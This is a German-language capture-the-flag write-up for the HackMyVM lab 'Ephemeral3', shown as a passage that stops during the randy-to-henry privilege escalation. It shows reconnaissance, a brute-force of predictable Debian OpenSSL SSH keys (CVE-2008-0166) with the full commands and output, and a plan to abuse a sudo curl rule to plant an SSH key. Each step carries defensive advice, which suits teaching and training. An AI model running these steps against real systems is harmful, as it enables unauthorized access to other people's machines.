@@ -1,0 +1,832 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ephemeral3 - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Ephemeral3 - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi / Editor</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">Web Browser / Google</div>
+                <div class="tool-item">Exploit-DB (Website)</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">tar</div>
+                <div class="tool-item">python2 (für Exploit)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">python3 (HTTP Server)</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">mkpasswd</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#weak-ssh-key">Weak SSH Key Exploit (CVE-2008-0166)</a></li>
+                <li><a href="#initial-access">Initial Access (randy)</a></li>
+                <li><a href="#privesc-henry">Privilege Escalation (randy -> henry)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (henry -> root)</a></li>
+                <li><a href="#poc">Proof of Concept (henry -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk nach aktiven Hosts durchsucht. Anschließend wird die lokale `/etc/hosts`-Datei bearbeitet, um der gefundenen IP einen Hostnamen zuzuordnen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host wird unter `192.168.2.115` mit der MAC `08:00:27:60:fc:d3` (PCS Systemtechnik GmbH -> VirtualBox) identifiziert. In der `/etc/hosts`-Datei des Angreifers wird dieser IP der Hostname `ephemeral.com` zugewiesen. Dies erleichtert die weitere Adressierung des Ziels. *Anmerkung:* Im späteren Verlauf wird auch `efe.hmv` als Hostname verwendet, was auf zwei mögliche Namen oder eine Inkonsistenz hindeutet. Für diesen Bericht wird `ephemeral.com` als primärer Hostname angenommen, wo nicht anders angegeben.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen Port-Scan auf `192.168.2.115` (oder `ephemeral.com`) durch. Die Verwendung von Hostnamen in der `/etc/hosts` ist gute Praxis.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standardempfehlungen zur Netzwerksicherheit und VM-Sicherung gelten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	00:50:56:c0:00:08	VMware, Inc.
+192.168.2.2	00:50:56:f4:7d:5f	VMware, Inc.
+192.168.2.115	08:00:27:60:fc:d3	PCS Systemtechnik GmbH
+192.168.2.254	00:50:56:f8:46:8c	VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.852 seconds (138.23 hosts/sec). 4 responded
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost
+127.0.1.1  	cyber
+#192.168.2.114   super.hmv
+192.168.2.113   translator.hmv
+192.168.2.115   ephemeral.com # Eintrag hinzugefügt/aktualisiert
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+                     </pre>
+                 </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf das Ziel (`192.168.2.115`, aufgelöst zu `efe.hmv` - hier wird der alternative Hostname verwendet) durchgeführt, um offene Ports und Dienste zu identifizieren.
+                *   `-sS`: TCP SYN Scan.
+                *   `-sC`: Standard-Skripte.
+                *   `-T5`: Sehr schnelles Timing.
+                *   `-sV`: Versionserkennung.
+                *   `-A`: OS-Erkennung, Version, Skripte, Traceroute.
+                *   `-p-`: Scan aller TCP-Ports.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nmap findet die erwarteten offenen Ports:
+                *   **Port 22/tcp:** OpenSSH 8.2p1 (Ubuntu).
+                *   **Port 80/tcp:** Apache httpd 2.4.41 (Ubuntu) mit der Standardseite.
+                Die SSH-Version (Ubuntu) ist ein wichtiger Hinweis.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 weiter. Halten Sie SSH im Hinterkopf. Der Hinweis auf Ubuntu könnte für spezifische Exploits oder Konfigurationen relevant sein.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Allgemeine Empfehlungen zur Absicherung von SSH und Apache. System aktuell halten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.115 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 15:00 CEST
+Nmap scan report for efe.hmv (192.168.2.115)
+Host is up (0.00036s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 f0:f2:b8:e0:da:41:9b:96:3b:b6:2b:98:95:4c:67:60 (RSA)
+|   256 a8:cd:e7:a7:0e:ce:62:86:35:96:02:43:9e:3e:9a:80 (ECDSA)
+|_  256 14:a7:57:a9:09:1a:7e:7e:ce:1e:91:f3:b1:1d:1b:fd (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver (`http://efe.hmv/`) auf bekannte Schwachstellen und Konfigurationsprobleme zu scannen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto bestätigt den Apache/2.4.41 (Ubuntu) Server und meldet wie üblich fehlende Security Header (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`). Es findet keine CGI-Verzeichnisse und vermutet ein ETag-Inode-Leak. Insgesamt liefert Nikto hier keine kritischen, direkt ausnutzbaren Schwachstellen, sondern weist auf allgemeine Härtungsmöglichkeiten hin. Die zusätzliche Meldung über SSL-Header ist irrelevant, da die Verbindung über HTTP (Port 80) lief.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nehmen Sie die fehlenden Header zur Kenntnis. Führen Sie eine Verzeichnis- und Dateisuche mit `gobuster` oder ähnlichen Tools durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Security Header im Apache, um die Sicherheit zu erhöhen. Konfigurieren Sie ETags sicher.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://efe.hmv/</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.115
++ Target Hostname:    efe.hmv
++ Target Port:        80
++ Start Time:         2022-10-04 15:01:29 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5e226cd366af5, mtime: gzip
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
++ 7785 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2022-10-04 15:01:44 (GMT2) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+      Portions of the server's headers (Apache/2.4.41) are not in
+      the Nikto 2.1.6 database or are newer than the known string. Would you like
+      to submit this information (no server specific data) to CIRT.net
+      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y
+# Irrelevante SSL-Meldungen entfernt, da Scan über HTTP lief
+# + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+# + The site uses SSL and Expect-CT header is not present.
+- Sent updated info to cirt.net -- Thank you!
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf `http://192.168.2.115` eingesetzt, wobei die gängige `common.txt`-Wortliste verwendet wird.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Gobuster findet neben der Standard-`index.html` zwei interessante Einträge:
+                 *   `/agency` (Status 301): Ein Verzeichnis, das vermutlich eine Unterwebseite oder einen Bereich darstellt.
+                 *   `/note.txt` (Status 200): Eine Textdatei. Solche Dateien enthalten oft Hinweise oder Zugangsdaten.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Laden Sie `/note.txt` herunter und analysieren Sie den Inhalt. Untersuchen Sie das Verzeichnis `/agency` weiter, indem Sie Gobuster erneut darauf ansetzen (`gobuster dir -u http://192.168.2.115/agency/ ...`).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Hinterlassen Sie keine Notizdateien oder andere sensible Informationen im Web-Root. Strukturieren Sie Webseiten logisch und entfernen Sie unnötige Verzeichnisse oder Dateien.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.115" -w /usr/share/dirb/wordlists/common.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.115
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Status codes:            200,204,301,302,307,401,403,500
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (alle angegebenen) ...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster
+===============================================================
+http://192.168.2.115/agency               (Status: 301) [Size: 315] [--> http://192.168.2.115/agency/]
+http://192.168.2.115/index.html           (Status: 200) [Size: 10918]
+http://192.168.2.115/note.txt             (Status: 200) [Size: 159]
+...
+===============================================================
+Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die gefundene Datei `note.txt` wird mit `wget` heruntergeladen und ihr Inhalt mit `cat` angezeigt.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Inhalt der Notiz ist ein entscheidender Hinweis: "Hey! I just generated your keys with OpenSSL. You should be able to use your private key now! If you have any questions just email me at henry@ephemeral.com". Dies deutet stark auf die Verwendung von OpenSSL zur Schlüsselgenerierung hin und erwähnt einen Benutzer/Admin namens `henry`. In Kombination mit dem Betriebssystem (Debian/Ubuntu laut Nmap) und dem Wissen um historische Schwachstellen, ist dies ein sehr starker Hinweis auf die **Debian OpenSSL Predictable PRNG Schwachstelle (CVE-2008-0166)**. Diese Schwachstelle führte dazu, dass über einen bestimmten Zeitraum auf Debian-basierten Systemen generierte SSH-Schlüssel (und andere Schlüssel) aus einem stark begrenzten Satz von Möglichkeiten stammten und daher erraten oder brute-forced werden konnten.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Recherchieren Sie nach Exploits für CVE-2008-0166. Laden Sie die bekannten Sammlungen schwacher Schlüssel herunter (oft als "Debian SSH key exploit" oder Exploit-DB 5720 / 5622 zu finden). Versuchen Sie, mit diesen bekannten schwachen Schlüsseln auf den SSH-Dienst zuzugreifen. Versuchen Sie Benutzernamen wie `henry`, `randy` oder andere, die möglicherweise im `/agency`-Verzeichnis gefunden werden.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Obwohl diese Schwachstelle alt ist (2008), könnten Systeme betroffen sein, die seitdem nicht aktualisiert oder deren Schlüssel nicht neu generiert wurden. Stellen Sie sicher, dass alle SSH-Schlüssel auf dem System mit einer gepatchten OpenSSL-Version generiert wurden. Ersetzen Sie vorsichtshalber alle alten Schlüssel.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.115/note.txt</span></div>
+                     <pre>
+--2022-10-04 15:05:10--  http://192.168.2.115/note.txt
+Connecting to 192.168.2.115:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 159 [text/plain]
+Saving to: ‘note.txt’
+
+note.txt                  100%[=====================================>]     159  --.-KB/s    in 0s
+
+2022-10-04 15:05:10 (21.8 MB/s) - ‘note.txt’ saved [159/159]
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat note.txt</span></div>
+                     <pre>
+Hey! I just generated your keys with OpenSSL.
+You should be able to use your private key now!
+
+If you have any questions just email me at henry@ephemeral.com
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Parallel zur Analyse von `note.txt` wird das Verzeichnis `/agency` weiter untersucht (vermutlich durch manuelles Browsen oder einen weiteren Gobuster-Scan, der hier nicht gezeigt wird). Es werden mehrere HTML-Seiten (`blog.html`, `contact.html`, etc.) und Unterverzeichnisse (`assets`, `css`, `fonts`, `img`, `js`) gefunden. Aus dem Inhalt dieser Seiten (wahrscheinlich `contact.html` oder Team-Seite) werden potenzielle E-Mail-Adressen und Namen extrahiert: `info@agencyperfect.com`, `randy@agencyperfect.com`, `henry`, `linda`, `Marc Jones`, `John Smith`, `Linda Smith`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Funde liefern potenzielle Benutzernamen für den SSH-Login-Versuch mit den schwachen Schlüsseln. Besonders relevant sind `randy` und `henry`, da `henry` bereits in `note.txt` erwähnt wurde. `randy` ist ebenfalls ein plausibler Benutzername.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fügen Sie `randy` und `henry` zur Liste der zu testenden Benutzernamen für den SSH-Exploit hinzu.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Vermeiden Sie es, Mitarbeiterlisten oder E-Mail-Adressen unnötig auf öffentlich zugänglichen Webseiten preiszugeben, da diese für Angriffe (Phishing, Brute-Force) genutzt werden können.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Ergebnisse der Enumeration von http://192.168.2.115/agency/
+
+# Gefundene Verzeichnisse/Dateien:
+http://192.168.2.115/agency/assets/              (Status: 301)
+http://192.168.2.115/agency/blog.html           (Status: 200)
+http://192.168.2.115/agency/contact.html        (Status: 200)
+http://192.168.2.115/agency/index.html          (Status: 200)
+http://192.168.2.115/agency/portfolio.html      (Status: 200)
+http://192.168.2.115/agency/assets/css/         (Status: 301)
+http://192.168.2.115/agency/assets/fonts/       (Status: 301)
+http://192.168.2.115/agency/assets/img/         (Status: 301)
+http://192.168.2.115/agency/assets/js/          (Status: 301)
+
+# Extrahierte Namen/Emails (potenzielle Benutzernamen):
+info@agencyperfect.com
+randy@agencyperfect.com -> randy
+henry
+linda
+Marc Jones
+John Smith
+Linda Smith
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="weak-ssh-key">
+            <h2>Weak SSH Key Exploit (CVE-2008-0166)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf dem Hinweis in `note.txt` und dem Wissen um die Debian OpenSSL-Schwachstelle (CVE-2008-0166) wird auf Exploit-DB nach entsprechenden Exploits gesucht (Exploit 5720). Ein Exploit-Paket (oft als `5622.tar.bz2` referenziert, da es die Schlüssel enthält) wird von GitHub heruntergeladen und entpackt. Dieses Paket enthält eine große Sammlung von vorhersagbaren SSH-Schlüsseln, die aufgrund der Schwachstelle generiert wurden.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Vorbereitung zur Ausnutzung der Schwachstelle ist korrekt. Das Herunterladen und Entpacken der bekannten schwachen Schlüssel ist der erste Schritt. Das Paket enthält typischerweise die Schlüssel sortiert nach Typ (RSA/DSA) und Schlüssellänge (z.B. 2048 Bit für RSA, wie im Nmap-Scan für den Host-Key gesehen).
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Verwenden Sie ein Skript (oft im Exploit-Paket enthalten oder separat verfügbar), um die gesammelten schwachen Schlüssel gegen den SSH-Server mit den potenziellen Benutzernamen (`randy`, `henry`) zu testen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass auf keinem System mehr Schlüssel verwendet werden, die von der CVE-2008-0166 betroffen sein könnten. Führen Sie ggf. Audits durch, um solche Schlüssel zu identifizieren und zu ersetzen.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Recherche nach Exploit für schwache Debian OpenSSL Keys (CVE-2008-0166)
+# Fund z.B. auf Exploit-DB: https://www.exploit-db.com/exploits/5720
+# Schlüsselpaket oft unter Referenz 5622 zu finden.
+                     </pre>
+                     <!-- Verzeichnis wird erstellt -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">mkdir openssl_5720_hack</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">cd openssl_5720_hack</span></div>
+                     <!-- Download des Schlüsselpakets -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/openssl_5720_hack]
+└─# <span class="command">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2</span></div>
+                     <pre>
+--2022-10-04 16:55:10--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
+Resolving github.com (github.com)... 140.82.121.4
+Connecting to github.com (github.com)|140.82.121.4|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/5622.tar.bz2 [following]
+--2022-10-04 16:55:11--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/5622.tar.bz2
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 96794183 (92M) [application/octet-stream]
+Saving to: ‘5622.tar.bz2’
+
+5622.tar.bz2          100%[=======================>]  92.31M  18.0MB/s    in 5.8s
+
+2022-10-04 16:55:17 (16.0 MB/s) - ‘5622.tar.bz2’ saved [96794183/96794183]
+                    </pre>
+                     <!-- Entpacken des Pakets -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/openssl_5720_hack]
+└─# <span class="command">tar -xvf 5622.tar.bz2</span></div>
+                     <pre>
+rsa/
+rsa/2048/
+rsa/2048/0000110429358049a1c509871503237e-9915
+rsa/2048/00001ff876c06b45970e18f825f40014-8198
+... (Sehr viele Dateien) ...
+dsa/
+dsa/1024/
+dsa/1024/0001011806d823180b6a388e1c5520ab-10484
+... (Sehr viele Dateien) ...
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Python2-Skript (`exploit.py`, vermutlich Teil des entpackten Pakets oder separat beschafft) wird verwendet, um die schwachen Schlüssel zu testen.
+                *   `python2 exploit.py`: Startet das Skript.
+                *   `rsa/2048/`: Gibt den Pfad zu den zu testenden RSA-Schlüsseln mit 2048 Bit an (passend zum Host-Key des Ziels).
+                *   `ephemeral.com`: Der Hostname des Ziels.
+                *   `randy`: Der zu testende Benutzername.
+                *   `22`: Der SSH-Port.
+                *   `5`: Anzahl der Threads (vermutlich).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Skript testet die Schlüssel aus der Sammlung gegen den SSH-Server für den Benutzer `randy`. Nach einiger Zeit findet es einen funktionierenden Schlüssel: `rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671`. Das Skript gibt auch direkt den SSH-Befehl aus, um sich mit diesem Schlüssel anzumelden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie den vom Skript vorgeschlagenen SSH-Befehl aus, um sich als `randy` anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Dies demonstriert die praktische Ausnutzbarkeit von CVE-2008-0166. Stellen Sie sicher, dass keine betroffenen Schlüssel mehr im Einsatz sind.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/openssl_5720_hack]
+└─# <span class="command">python2 exploit.py rsa/2048/ ephemeral.com randy 22 5</span></div>
+                     <pre>
+Searching for user 'randy' on host 'ephemeral.com' port '22' using keylength '2048'
+Loaded 32768 keys
+
+Starting Brute force. This will take a while...
+Threads: 5
+
+Tested 11106 keys | Remaining 21662 keys | Aprox. Speed 125/sec
+Tested 11720 keys | Remaining 21048 keys | Aprox. Speed 122/sec
+Tested 12343 keys | Remaining 20425 keys | Aprox. Speed 124/sec
+Tested 12959 keys | Remaining 19809 keys | Aprox. Speed 123/sec
+... (weitere Fortschrittsanzeigen) ...
+Key Found in file: 0028ca6d22c68ed0a1e3f6f79573100a-31671
+Execute: ssh -lrandy -p22 -i rsa/2048//0028ca6d22c68ed0a1e3f6f79573100a-31671 ephemeral.com
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (randy)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der vom Exploit-Skript bereitgestellte Befehl wird ausgeführt, um sich per SSH als Benutzer `randy` mit dem gefundenen schwachen privaten Schlüssel (`-i rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671`) am Zielsystem anzumelden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login ist erfolgreich! Es ist keine Passworteingabe erforderlich, da die schlüsselbasierte Authentifizierung mit dem schwachen Schlüssel funktioniert. Der Angreifer erhält eine Shell als Benutzer `randy` auf dem System `ephemeral`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Initialer Zugriff erreicht. Beginnen Sie mit der lokalen Enumeration als `randy`. Überprüfen Sie `sudo -l` als Erstes.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Der kompromittierte Schlüssel muss sofort aus den `authorized_keys` des `randy`-Benutzers entfernt werden. Der Benutzer sollte einen neuen, sicher generierten Schlüssel erhalten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/openssl_5720_hack]
+└─# <span class="command">ssh -lrandy -p22 -i rsa/2048//0028ca6d22c68ed0a1e3f6f79573100a-31671 ephemeral.com</span></div>
+                    <pre>
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-30-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information as of Tue Oct  4 17:08:25 CEST 2022
+
+  System load:  0.0               Processes:             263
+  Usage of /:   17.9% of 9.78GB   Users logged in:       0
+  Memory usage: 14%               IPv4 address for eth0: 192.168.2.115
+  Swap usage:   0%
+
+
+193 updates can be applied immediately.
+127 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+New release '22.04.1 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+Last login: Tue Oct  4 15:12:13 2022 from 192.168.2.140
+                    </pre>
+                     <div class="prompt no-kali-prompt">randy@ephemeral:~$ </div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privesc-henry">
+            <h2>Privilege Escalation (randy -> henry)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach dem Login als `randy` wird sofort `sudo -l` ausgeführt, um die `sudo`-Berechtigungen dieses Benutzers zu überprüfen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein weiterer wichtiger Fund! `randy` darf den Befehl `/usr/bin/curl` als Benutzer `henry` ohne Passwortabfrage ausführen: `(henry) NOPASSWD: /usr/bin/curl`. Da `curl` Dateien herunterladen und auch auf lokale Dateien (mit `file://`) zugreifen kann (obwohl letzteres hier nicht direkt funktioniert), bietet dies einen Weg, um als `henry` zu agieren. Insbesondere kann `curl` verwendet werden, um Dateien auf das System zu schreiben (mit `-o`) oder von einem kontrollierten Server zu laden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie `sudo -u henry curl`, um Aktionen als `henry` durchzuführen. Ein gängiger Trick ist, den eigenen öffentlichen SSH-Schlüssel (`id_rsa.pub`) auf dem Angreifer-System per HTTP bereitzustellen und dann `curl` zu verwenden, um diesen Schlüssel herunterzuladen und in die `authorized_keys`-Datei von `henry` (`/home/henry/.ssh/authorized_keys`) zu schreiben. Danach sollte ein SSH-Login als `henry` mit dem eigenen privaten Schlüssel möglich sein.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist gefährlich. `curl` kann missbraucht werden, um Dateien zu lesen oder zu schreiben und Befehle indirekt auszuführen (z.B. durch Herunterladen und Ausführen von Skripten, wenn weitere Lücken bestehen). Beschränken Sie die `sudo`-Rechte für `curl` stark oder entfernen Sie sie. Erlauben Sie niemals `NOPASSWD` für potenziell gefährliche Befehle.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">randy@ephemeral:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for randy on ephemeral:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User randy may run the following commands on ephemeral:
+    (henry) NOPASSWD: /usr/bin/curl
+                    </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Pentester bereitet den Angriff vor, um sich per SSH als `henry` einzuloggen.
+                 1.  **HTTP-Server starten:** Auf dem Angreifer-System (Kali) wird im Verzeichnis `~/.ssh` (wo sich der öffentliche Schlüssel `id_rsa.pub` befindet) ein einfacher Python-HTTP-Server auf Port 80 gestartet. Dies macht den öffentlichen Schlüssel über `http://[Angreifer-IP]/id_rsa.pub` erreichbar.
+                 2.  **Test mit `php://filter` (fehlgeschlagen):** Es wird versucht, `curl` mit einem PHP-Filter zu verwenden, um `/etc/passwd` zu lesen. Dies schlägt fehl, da `php://` von dieser `curl`-Version nicht unterstützt wird.
